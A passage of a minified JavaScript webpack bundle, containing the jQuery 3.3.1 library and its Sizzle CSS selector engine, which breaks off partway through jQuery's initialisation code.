!function(e){var t={};function r(i){if(t[i])return t[i].exports;var n=t[i]={i:i,l:!1,exports:{}};return e[i].call(n.exports,n,n.exports,r),n.l=!0,n.exports}r.m=e,r.c=t,r.d=function(e,t,i){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:i})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var i=Object.create(null);if(r.r(i),Object.defineProperty(i,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)r.d(i,n,function(t){return e[t]}.bind(null,n));return i},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="/",r(r.s=24)}([function(e,t,r){var i;!function(t,r){"use strict";"object"==typeof e.exports?e.exports=t.document?r(t,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return r(e)}:r(t)}("undefined"!=typeof window?window:this,function(r,n){"use strict";var a=[],s=r.document,o=Object.getPrototypeOf,u=a.slice,l=a.concat,c=a.push,d=a.indexOf,f={},h=f.toString,p=f.hasOwnProperty,g=p.toString,y=g.call(Object),v={},m=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType},L=function(e){return null!=e&&e===e.window},M={type:!0,src:!0,noModule:!0};function T(e,t,r){var i,n=(t=t||s).createElement("script");if(n.text=e,r)for(i in M)r[i]&&(n[i]=r[i]);t.head.appendChild(n).parentNode.removeChild(n)}function A(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?f[h.call(e)]||"object":typeof e}var w=function(e,t){return new w.fn.init(e,t)},E=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;function S(e){var t=!!e&&"length"in e&&e.length,r=A(e);return!m(e)&&!L(e)&&("array"===r||0===t||"number"==typeof t&&t>0&&t-1 in e)}w.fn=w.prototype={jquery:"3.3.1",constructor:w,length:0,toArray:function(){return u.call(this)},get:function(e){return null==e?u.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,r){return e.call(t,r,t)}))},slice:function(){return this.pushStack(u.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,r=+e+(e<0?t:0);return this.pushStack(r>=0&&r<t?[this[r]]:[])},end:function(){return this.prevObject||this.constructor()},push:c,sort:a.sort,splice:a.splice},w.extend=w.fn.extend=function(){var e,t,r,i,n,a,s=arguments[0]||{},o=1,u=arguments.length,l=!1;for("boolean"==typeof s&&(l=s,s=arguments[o]||{},o++),"object"==typeof s||m(s)||(s={}),o===u&&(s=this,o--);o<u;o++)if(null!=(e=arguments[o]))for(t in e)r=s[t],s!==(i=e[t])&&(l&&i&&(w.isPlainObject(i)||(n=Array.isArray(i)))?(n?(n=!1,a=r&&Array.isArray(r)?r:[]):a=r&&w.isPlainObject(r)?r:{},s[t]=w.extend(l,a,i)):void 0!==i&&(s[t]=i));return s},w.extend({expando:"jQuery"+("3.3.1"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,r;return!(!e||"[object Object]"!==h.call(e))&&(!(t=o(e))||"function"==typeof(r=p.call(t,"constructor")&&t.constructor)&&g.call(r)===y)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){T(e)},each:function(e,t){var r,i=0;if(S(e))for(r=e.length;i<r&&!1!==t.call(e[i],i,e[i]);i++);else for(i in e)if(!1===t.call(e[i],i,e[i]))break;return e},trim:function(e){return null==e?"":(e+"").replace(E,"")},makeArray:function(e,t){var r=t||[];return null!=e&&(S(Object(e))?w.merge(r,"string"==typeof e?[e]:e):c.call(r,e)),r},inArray:function(e,t,r){return null==t?-1:d.call(t,e,r)},merge:function(e,t){for(var r=+t.length,i=0,n=e.length;i<r;i++)e[n++]=t[i];return e.length=n,e},grep:function(e,t,r){for(var i=[],n=0,a=e.length,s=!r;n<a;n++)!t(e[n],n)!==s&&i.push(e[n]);return i},map:function(e,t,r){var i,n,a=0,s=[];if(S(e))for(i=e.length;a<i;a++)null!=(n=t(e[a],a,r))&&s.push(n);else for(a in e)null!=(n=t(e[a],a,r))&&s.push(n);return l.apply([],s)},guid:1,support:v}),"function"==typeof Symbol&&(w.fn[Symbol.iterator]=a[Symbol.iterator]),w.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){f["[object "+t+"]"]=t.toLowerCase()});var D=function(e){var t,r,i,n,a,s,o,u,l,c,d,f,h,p,g,y,v,m,L,M="sizzle"+1*new Date,T=e.document,A=0,w=0,E=se(),S=se(),D=se(),b=function(e,t){return e===t&&(d=!0),0},j={}.hasOwnProperty,C=[],I=C.pop,x=C.push,N=C.push,_=C.slice,O=function(e,t){for(var r=0,i=e.length;r<i;r++)if(e[r]===t)return r;return-1},k="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",R="[\\x20\\t\\r\\n\\f]",P="(?:\\\\.|[\\w-]|[^\0-\\xa0])+",F="\\["+R+"*("+P+")(?:"+R+"*([*^$|!~]?=)"+R+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+P+"))|)"+R+"*\\]",B=":("+P+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+F+")*)|.*)\\)|)",U=new RegExp(R+"+","g"),z=new RegExp("^"+R+"+|((?:^|[^\\\\])(?:\\\\.)*)"+R+"+$","g"),G=new RegExp("^"+R+"*,"+R+"*"),Y=new RegExp("^"+R+"*([>+~]|"+R+")"+R+"*"),Q=new RegExp("="+R+"*([^\\]'\"]*?)"+R+"*\\]","g"),H=new RegExp(B),K=new RegExp("^"+P+"$"),W={ID:new RegExp("^#("+P+")"),CLASS:new RegExp("^\\.("+P+")"),TAG:new RegExp("^("+P+"|[*])"),ATTR:new RegExp("^"+F),PSEUDO:new RegExp("^"+B),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+R+"*(even|odd|(([+-]|)(\\d*)n|)"+R+"*(?:([+-]|)"+R+"*(\\d+)|))"+R+"*\\)|)","i"),bool:new RegExp("^(?:"+k+")$","i"),needsContext:new RegExp("^"+R+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+R+"*((?:-\\d)?\\d*)"+R+"*\\)|)(?=[^-]|$)","i")},V=/^(?:input|select|textarea|button)$/i,q=/^h\d$/i,X=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,J=/[+~]/,$=new RegExp("\\\\([\\da-f]{1,6}"+R+"?|("+R+")|.)","ig"),ee=function(e,t,r){var i="0x"+t-65536;return i!=i||r?t:i<0?String.fromCharCode(i+65536):String.fromCharCode(i>>10|55296,1023&i|56320)},te=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,re=function(e,t){return t?"\0"===e?"ï¿½":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},ie=function(){f()},ne=me(function(e){return!0===e.disabled&&("form"in e||"label"in e)},{dir:"parentNode",next:"legend"});try{N.apply(C=_.call(T.childNodes),T.childNodes),C[T.childNodes.length].nodeType}catch(e){N={apply:C.length?function(e,t){x.apply(e,_.call(t))}:function(e,t){for(var r=e.length,i=0;e[r++]=t[i++];);e.length=r-1}}}function ae(e,t,i,n){var a,o,l,c,d,p,v,m=t&&t.ownerDocument,A=t?t.nodeType:9;if(i=i||[],"string"!=typeof e||!e||1!==A&&9!==A&&11!==A)return i;if(!n&&((t?t.ownerDocument||t:T)!==h&&f(t),t=t||h,g)){if(11!==A&&(d=Z.exec(e)))if(a=d[1]){if(9===A){if(!(l=t.getElementById(a)))return i;if(l.id===a)return i.push(l),i}else if(m&&(l=m.getElementById(a))&&L(t,l)&&l.id===a)return i.push(l),i}else{if(d[2])return N.apply(i,t.getElementsByTagName(e)),i;if((a=d[3])&&r.getElementsByClassName&&t.getElementsByClassName)return N.apply(i,t.getElementsByClassName(a)),i}if(r.qsa&&!D[e+" "]&&(!y||!y.test(e))){if(1!==A)m=t,v=e;else if("object"!==t.nodeName.toLowerCase()){for((c=t.getAttribute("id"))?c=c.replace(te,re):t.setAttribute("id",c=M),o=(p=s(e)).length;o--;)p[o]="#"+c+" "+ve(p[o]);v=p.join(","),m=J.test(e)&&ge(t.parentNode)||t}if(v)try{return N.apply(i,m.querySelectorAll(v)),i}catch(e){}finally{c===M&&t.removeAttribute("id")}}}return u(e.replace(z,"$1"),t,i,n)}function se(){var e=[];return function t(r,n){return e.push(r+" ")>i.cacheLength&&delete t[e.shift()],t[r+" "]=n}}function oe(e){return e[M]=!0,e}function ue(e){var t=h.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function le(e,t){for(var r=e.split("|"),n=r.length;n--;)i.attrHandle[r[n]]=t}function ce(e,t){var r=t&&e,i=r&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(i)return i;if(r)for(;r=r.nextSibling;)if(r===t)return-1;return e?1:-1}function de(e){return function(t){return"input"===t.nodeName.toLowerCase()&&t.type===e}}function fe(e){return function(t){var r=t.nodeName.toLowerCase();return("input"===r||"button"===r)&&t.type===e}}function he(e){return function(t){return"form"in t?t.parentNode&&!1===t.disabled?"label"in t?"label"in t.parentNode?t.parentNode.disabled===e:t.disabled===e:t.isDisabled===e||t.isDisabled!==!e&&ne(t)===e:t.disabled===e:"label"in t&&t.disabled===e}}function pe(e){return oe(function(t){return t=+t,oe(function(r,i){for(var n,a=e([],r.length,t),s=a.length;s--;)r[n=a[s]]&&(r[n]=!(i[n]=r[n]))})})}function ge(e){return e&&void 0!==e.getElementsByTagName&&e}for(t in r=ae.support={},a=ae.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return!!t&&"HTML"!==t.nodeName},f=ae.setDocument=function(e){var t,n,s=e?e.ownerDocument||e:T;return s!==h&&9===s.nodeType&&s.documentElement?(p=(h=s).documentElement,g=!a(h),T!==h&&(n=h.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",ie,!1):n.attachEvent&&n.attachEvent("onunload",ie)),r.attributes=ue(function(e){return e.className="i",!e.getAttribute("className")}),r.getElementsByTagName=ue(function(e){return e.appendChild(h.createComment("")),!e.getElementsByTagName("*").length}),r.getElementsByClassName=X.test(h.getElementsByClassName),r.getById=ue(function(e){return p.appendChild(e).id=M,!h.getElementsByName||!h.getElementsByName(M).length}),r.getById?(i.filter.ID=function(e){var t=e.replace($,ee);return function(e){return e.getAttribute("id")===t}},i.find.ID=function(e,t){if(void 0!==t.getElementById&&g){var r=t.getElementById(e);return r?[r]:[]}}):(i.filter.ID=function(e){var t=e.replace($,ee);return function(e){var r=void 0!==e.getAttributeNode&&e.getAttributeNode("id");return r&&r.value===t}},i.find.ID=function(e,t){if(void 0!==t.getElementById&&g){var r,i,n,a=t.getElementById(e);if(a){if((r=a.getAttributeNode("id"))&&r.value===e)return[a];for(n=t.getElementsByName(e),i=0;a=n[i++];)if((r=a.getAttributeNode("id"))&&r.value===e)return[a]}return[]}}),i.find.TAG=r.getElementsByTagName?function(e,t){return void 0!==t.getElementsByTagName?t.getElementsByTagName(e):r.qsa?t.querySelectorAll(e):void 0}:function(e,t){var r,i=[],n=0,a=t.getElementsByTagName(e);if("*"===e){for(;r=a[n++];)1===r.nodeType&&i.push(r);return i}return a},i.find.CLASS=r.getElementsByClassName&&function(e,t){if(void 0!==t.getElementsByClassName&&g)return t.getElementsByClassName(e)},v=[],y=[],(r.qsa=X.test(h.querySelectorAll))&&(ue(function(e){p.appendChild(e).innerHTML="<a id='"+M+"'></a><select id='"+M+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&y.push("[*^$]="+R+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||y.push("\\["+R+"*(?:value|"+k+")"),e.querySelectorAll("[id~="+M+"-]").length||y.push("~="),e.querySelectorAll(":checked").length||y.push(":checked"),e.querySelectorAll("a#"+M+"+*").length||y.push(".#.+[+~]")}),ue(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=h.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&y.push("name"+R+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&y.push(":enabled",":disabled"),p.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&y.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),y.push(",.*:")})),(r.matchesSelector=X.test(m=p.matches||p.webkitMatchesSelector||p.mozMatchesSelector||p.oMatchesSelector||p.msMatchesSelector))&&ue(function(e){r.disconnectedMatch=m.call(e,"*"),m.call(e,"[s!='']:x"),v.push("!=",B)}),y=y.length&&new RegExp(y.join("|")),v=v.length&&new RegExp(v.join("|")),t=X.test(p.compareDocumentPosition),L=t||X.test(p.contains)?function(e,t){var r=9===e.nodeType?e.documentElement:e,i=t&&t.parentNode;return e===i||!(!i||1!==i.nodeType||!(r.contains?r.contains(i):e.compareDocumentPosition&&16&e.compareDocumentPosition(i)))}:function(e,t){if(t)for(;t=t.parentNode;)if(t===e)return!0;return!1},b=t?function(e,t){if(e===t)return d=!0,0;var i=!e.compareDocumentPosition-!t.compareDocumentPosition;return i||(1&(i=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!r.sortDetached&&t.compareDocumentPosition(e)===i?e===h||e.ownerDocument===T&&L(T,e)?-1:t===h||t.ownerDocument===T&&L(T,t)?1:c?O(c,e)-O(c,t):0:4&i?-1:1)}:function(e,t){if(e===t)return d=!0,0;var r,i=0,n=e.parentNode,a=t.parentNode,s=[e],o=[t];if(!n||!a)return e===h?-1:t===h?1:n?-1:a?1:c?O(c,e)-O(c,t):0;if(n===a)return ce(e,t);for(r=e;r=r.parentNode;)s.unshift(r);for(r=t;r=r.parentNode;)o.unshift(r);for(;s[i]===o[i];)i++;return i?ce(s[i],o[i]):s[i]===T?-1:o[i]===T?1:0},h):h},ae.matches=function(e,t){return ae(e,null,null,t)},ae.matchesSelector=function(e,t){if((e.ownerDocument||e)!==h&&f(e),t=t.replace(Q,"='$1']"),r.matchesSelector&&g&&!D[t+" "]&&(!v||!v.test(t))&&(!y||!y.test(t)))try{var i=m.call(e,t);if(i||r.disconnectedMatch||e.document&&11!==e.document.nodeType)return i}catch(e){}return ae(t,h,null,[e]).length>0},ae.contains=function(e,t){return(e.ownerDocument||e)!==h&&f(e),L(e,t)},ae.attr=function(e,t){(e.ownerDocument||e)!==h&&f(e);var n=i.attrHandle[t.toLowerCase()],a=n&&j.call(i.attrHandle,t.toLowerCase())?n(e,t,!g):void 0;return void 0!==a?a:r.attributes||!g?e.getAttribute(t):(a=e.getAttributeNode(t))&&a.specified?a.value:null},ae.escape=function(e){return(e+"").replace(te,re)},ae.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},ae.uniqueSort=function(e){var t,i=[],n=0,a=0;if(d=!r.detectDuplicates,c=!r.sortStable&&e.slice(0),e.sort(b),d){for(;t=e[a++];)t===e[a]&&(n=i.push(a));for(;n--;)e.splice(i[n],1)}return c=null,e},n=ae.getText=function(e){var t,r="",i=0,a=e.nodeType;if(a){if(1===a||9===a||11===a){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)r+=n(e)}else if(3===a||4===a)return e.nodeValue}else for(;t=e[i++];)r+=n(t);return r},(i=ae.selectors={cacheLength:50,createPseudo:oe,match:W,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace($,ee),e[3]=(e[3]||e[4]||e[5]||"").replace($,ee),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||ae.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&ae.error(e[0]),e},PSEUDO:function(e){var t,r=!e[6]&&e[2];return W.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":r&&H.test(r)&&(t=s(r,!0))&&(t=r.indexOf(")",r.length-t)-r.length)&&(e[0]=e[0].slice(0,t),e[2]=r.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace($,ee).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=E[e+" "];return t||(t=new RegExp("(^|"+R+")"+e+"("+R+"|$)"))&&E(e,function(e){return t.test("string"==typeof e.className&&e.className||void 0!==e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(e,t,r){return function(i){var n=ae.attr(i,e);return null==n?"!="===t:!t||(n+="","="===t?n===r:"!="===t?n!==r:"^="===t?r&&0===n.indexOf(r):"*="===t?r&&n.indexOf(r)>-1:"$="===t?r&&n.slice(-r.length)===r:"~="===t?(" "+n.replace(U," ")+" ").indexOf(r)>-1:"|="===t&&(n===r||n.slice(0,r.length+1)===r+"-"))}},CHILD:function(e,t,r,i,n){var a="nth"!==e.slice(0,3),s="last"!==e.slice(-4),o="of-type"===t;return 1===i&&0===n?function(e){return!!e.parentNode}:function(t,r,u){var l,c,d,f,h,p,g=a!==s?"nextSibling":"previousSibling",y=t.parentNode,v=o&&t.nodeName.toLowerCase(),m=!u&&!o,L=!1;if(y){if(a){for(;g;){for(f=t;f=f[g];)if(o?f.nodeName.toLowerCase()===v:1===f.nodeType)return!1;p=g="only"===e&&!p&&"nextSibling"}return!0}if(p=[s?y.firstChild:y.lastChild],s&&m){for(L=(h=(l=(c=(d=(f=y)[M]||(f[M]={}))[f.uniqueID]||(d[f.uniqueID]={}))[e]||[])[0]===A&&l[1])&&l[2],f=h&&y.childNodes[h];f=++h&&f&&f[g]||(L=h=0)||p.pop();)if(1===f.nodeType&&++L&&f===t){c[e]=[A,h,L];break}}else if(m&&(L=h=(l=(c=(d=(f=t)[M]||(f[M]={}))[f.uniqueID]||(d[f.uniqueID]={}))[e]||[])[0]===A&&l[1]),!1===L)for(;(f=++h&&f&&f[g]||(L=h=0)||p.pop())&&((o?f.nodeName.toLowerCase()!==v:1!==f.nodeType)||!++L||(m&&((c=(d=f[M]||(f[M]={}))[f.uniqueID]||(d[f.uniqueID]={}))[e]=[A,L]),f!==t)););return(L-=n)===i||L%i==0&&L/i>=0}}},PSEUDO:function(e,t){var r,n=i.pseudos[e]||i.setFilters[e.toLowerCase()]||ae.error("unsupported pseudo: "+e);return n[M]?n(t):n.length>1?(r=[e,e,"",t],i.setFilters.hasOwnProperty(e.toLowerCase())?oe(function(e,r){for(var i,a=n(e,t),s=a.length;s--;)e[i=O(e,a[s])]=!(r[i]=a[s])}):function(e){return n(e,0,r)}):n}},pseudos:{not:oe(function(e){var t=[],r=[],i=o(e.replace(z,"$1"));return i[M]?oe(function(e,t,r,n){for(var a,s=i(e,null,n,[]),o=e.length;o--;)(a=s[o])&&(e[o]=!(t[o]=a))}):function(e,n,a){return t[0]=e,i(t,null,a,r),t[0]=null,!r.pop()}}),has:oe(function(e){return function(t){return ae(e,t).length>0}}),contains:oe(function(e){return e=e.replace($,ee),function(t){return(t.textContent||t.innerText||n(t)).indexOf(e)>-1}}),lang:oe(function(e){return K.test(e||"")||ae.error("unsupported lang: "+e),e=e.replace($,ee).toLowerCase(),function(t){var r;do{if(r=g?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return(r=r.toLowerCase())===e||0===r.indexOf(e+"-")}while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var r=e.location&&e.location.hash;return r&&r.slice(1)===t.id},root:function(e){return e===p},focus:function(e){return e===h.activeElement&&(!h.hasFocus||h.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:he(!1),disabled:he(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!i.pseudos.empty(e)},header:function(e){return q.test(e.nodeName)},input:function(e){return V.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:pe(function(){return[0]}),last:pe(function(e,t){return[t-1]}),eq:pe(function(e,t,r){return[r<0?r+t:r]}),even:pe(function(e,t){for(var r=0;r<t;r+=2)e.push(r);return e}),odd:pe(function(e,t){for(var r=1;r<t;r+=2)e.push(r);return e}),lt:pe(function(e,t,r){for(var i=r<0?r+t:r;--i>=0;)e.push(i);return e}),gt:pe(function(e,t,r){for(var i=r<0?r+t:r;++i<t;)e.push(i);return e})}}).pseudos.nth=i.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})i.pseudos[t]=de(t);for(t in{submit:!0,reset:!0})i.pseudos[t]=fe(t);function ye(){}function ve(e){for(var t=0,r=e.length,i="";t<r;t++)i+=e[t].value;return i}function me(e,t,r){var i=t.dir,n=t.next,a=n||i,s=r&&"parentNode"===a,o=w++;return t.first?function(t,r,n){for(;t=t[i];)if(1===t.nodeType||s)return e(t,r,n);return!1}:function(t,r,u){var l,c,d,f=[A,o];if(u){for(;t=t[i];)if((1===t.nodeType||s)&&e(t,r,u))return!0}else for(;t=t[i];)if(1===t.nodeType||s)if(c=(d=t[M]||(t[M]={}))[t.uniqueID]||(d[t.uniqueID]={}),n&&n===t.nodeName.toLowerCase())t=t[i]||t;else{if((l=c[a])&&l[0]===A&&l[1]===o)return f[2]=l[2];if(c[a]=f,f[2]=e(t,r,u))return!0}return!1}}function Le(e){return e.length>1?function(t,r,i){for(var n=e.length;n--;)if(!e[n](t,r,i))return!1;return!0}:e[0]}function Me(e,t,r,i,n){for(var a,s=[],o=0,u=e.length,l=null!=t;o<u;o++)(a=e[o])&&(r&&!r(a,i,n)||(s.push(a),l&&t.push(o)));return s}function Te(e,t,r,i,n,a){return i&&!i[M]&&(i=Te(i)),n&&!n[M]&&(n=Te(n,a)),oe(function(a,s,o,u){var l,c,d,f=[],h=[],p=s.length,g=a||function(e,t,r){for(var i=0,n=t.length;i<n;i++)ae(e,t[i],r);return r}(t||"*",o.nodeType?[o]:o,[]),y=!e||!a&&t?g:Me(g,f,e,o,u),v=r?n||(a?e:p||i)?[]:s:y;if(r&&r(y,v,o,u),i)for(l=Me(v,h),i(l,[],o,u),c=l.length;c--;)(d=l[c])&&(v[h[c]]=!(y[h[c]]=d));if(a){if(n||e){if(n){for(l=[],c=v.length;c--;)(d=v[c])&&l.push(y[c]=d);n(null,v=[],l,u)}for(c=v.length;c--;)(d=v[c])&&(l=n?O(a,d):f[c])>-1&&(a[l]=!(s[l]=d))}}else v=Me(v===s?v.splice(p,v.length):v),n?n(null,s,v,u):N.apply(s,v)})}function Ae(e){for(var t,r,n,a=e.length,s=i.relative[e[0].type],o=s||i.relative[" "],u=s?1:0,c=me(function(e){return e===t},o,!0),d=me(function(e){return O(t,e)>-1},o,!0),f=[function(e,r,i){var n=!s&&(i||r!==l)||((t=r).nodeType?c(e,r,i):d(e,r,i));return t=null,n}];u<a;u++)if(r=i.relative[e[u].type])f=[me(Le(f),r)];else{if((r=i.filter[e[u].type].apply(null,e[u].matches))[M]){for(n=++u;n<a&&!i.relative[e[n].type];n++);return Te(u>1&&Le(f),u>1&&ve(e.slice(0,u-1).concat({value:" "===e[u-2].type?"*":""})).replace(z,"$1"),r,u<n&&Ae(e.slice(u,n)),n<a&&Ae(e=e.slice(n)),n<a&&ve(e))}f.push(r)}return Le(f)}return ye.prototype=i.filters=i.pseudos,i.setFilters=new ye,s=ae.tokenize=function(e,t){var r,n,a,s,o,u,l,c=S[e+" "];if(c)return t?0:c.slice(0);for(o=e,u=[],l=i.preFilter;o;){for(s in r&&!(n=G.exec(o))||(n&&(o=o.slice(n[0].length)||o),u.push(a=[])),r=!1,(n=Y.exec(o))&&(r=n.shift(),a.push({value:r,type:n[0].replace(z," ")}),o=o.slice(r.length)),i.filter)!(n=W[s].exec(o))||l[s]&&!(n=l[s](n))||(r=n.shift(),a.push({value:r,type:s,matches:n}),o=o.slice(r.length));if(!r)break}return t?o.length:o?ae.error(e):S(e,u).slice(0)},o=ae.compile=function(e,t){var r,n=[],a=[],o=D[e+" "];if(!o){for(t||(t=s(e)),r=t.length;r--;)(o=Ae(t[r]))[M]?n.push(o):a.push(o);(o=D(e,function(e,t){var r=t.length>0,n=e.length>0,a=function(a,s,o,u,c){var d,p,y,v=0,m="0",L=a&&[],M=[],T=l,w=a||n&&i.find.TAG("*",c),E=A+=null==T?1:Math.random()||.1,S=w.length;for(c&&(l=s===h||s||c);m!==S&&null!=(d=w[m]);m++){if(n&&d){for(p=0,s||d.ownerDocument===h||(f(d),o=!g);y=e[p++];)if(y(d,s||h,o)){u.push(d);break}c&&(A=E)}r&&((d=!y&&d)&&v--,a&&L.push(d))}if(v+=m,r&&m!==v){for(p=0;y=t[p++];)y(L,M,s,o);if(a){if(v>0)for(;m--;)L[m]||M[m]||(M[m]=I.call(u));M=Me(M)}N.apply(u,M),c&&!a&&M.length>0&&v+t.length>1&&ae.uniqueSort(u)}return c&&(A=E,l=T),L};return r?oe(a):a}(a,n))).selector=e}return o},u=ae.select=function(e,t,r,n){var a,u,l,c,d,f="function"==typeof e&&e,h=!n&&s(e=f.selector||e);if(r=r||[],1===h.length){if((u=h[0]=h[0].slice(0)).length>2&&"ID"===(l=u[0]).type&&9===t.nodeType&&g&&i.relative[u[1].type]){if(!(t=(i.find.ID(l.matches[0].replace($,ee),t)||[])[0]))return r;f&&(t=t.parentNode),e=e.slice(u.shift().value.length)}for(a=W.needsContext.test(e)?0:u.length;a--&&(l=u[a],!i.relative[c=l.type]);)if((d=i.find[c])&&(n=d(l.matches[0].replace($,ee),J.test(u[0].type)&&ge(t.parentNode)||t))){if(u.splice(a,1),!(e=n.length&&ve(u)))return N.apply(r,n),r;break}}return(f||o(e,h))(n,t,!g,r,!t||J.test(e)&&ge(t.parentNode)||t),r},r.sortStable=M.split("").sort(b).join("")===M,r.detectDuplicates=!!d,f(),r.sortDetached=ue(function(e){return 1&e.compareDocumentPosition(h.createElement("fieldset"))}),ue(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||le("type|href|height|width",function(e,t,r){if(!r)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),r.attributes&&ue(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||le("value",function(e,t,r){if(!r&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ue(function(e){return null==e.getAttribute("disabled")})||le(k,function(e,t,r){var i;if(!r)return!0===e[t]?t.toLowerCase():(i=e.getAttributeNode(t))&&i.specified?i.value:null}),ae}(r);w.find=D,w.expr=D.selectors,w.expr[":"]=w.expr.pseudos,w.uniqueSort=w.unique=D.uniqueSort,w.text=D.getText,w.isXMLDoc=D.isXML,w.contains=D.contains,w.escapeSelector=D.escape;var b=function(e,t,r){for(var i=[],n=void 0!==r;(e=e[t])&&9!==e.nodeType;)if(1===e.nodeType){if(n&&w(e).is(r))break;i.push(e)}return i},j=function(e,t){for(var r=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&r.push(e);return r},C=w.expr.match.needsContext;function I(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var x=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function N(e,t,r){return m(t)?w.grep(e,function(e,i){return!!t.call(e,i,e)!==r}):t.nodeType?w.grep(e,function(e){return e===t!==r}):"string"!=typeof t?w.grep(e,function(e){return d.call(t,e)>-1!==r}):w.filter(t,e,r)}w.filter=function(e,t,r){var i=t[0];return r&&(e=":not("+e+")"),1===t.length&&1===i.nodeType?w.find.matchesSelector(i,e)?[i]:[]:w.find.matches(e,w.grep(t,function(e){return 1===e.nodeType}))},w.fn.extend({find:function(e){var t,r,i=this.length,n=this;if("string"!=typeof e)return this.pushStack(w(e).filter(function(){for(t=0;t<i;t++)if(w.contains(n[t],this))return!0}));for(r=this.pushStack([]),t=0;t<i;t++)w.find(e,n[t],r);return i>1?w.uniqueSort(r):r},filter:function(e){return this.pushStack(N(this,e||[],!1))},not:function(e){return this.pushStack(N(this,e||[],!0))},is:function(e){return!!N(this,"string"==typeof e&&C.test(e)?w(e):e||[],!1).length}});var _,O=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(w.fn.init=function(e,t,r){var i,n;if(!e)return 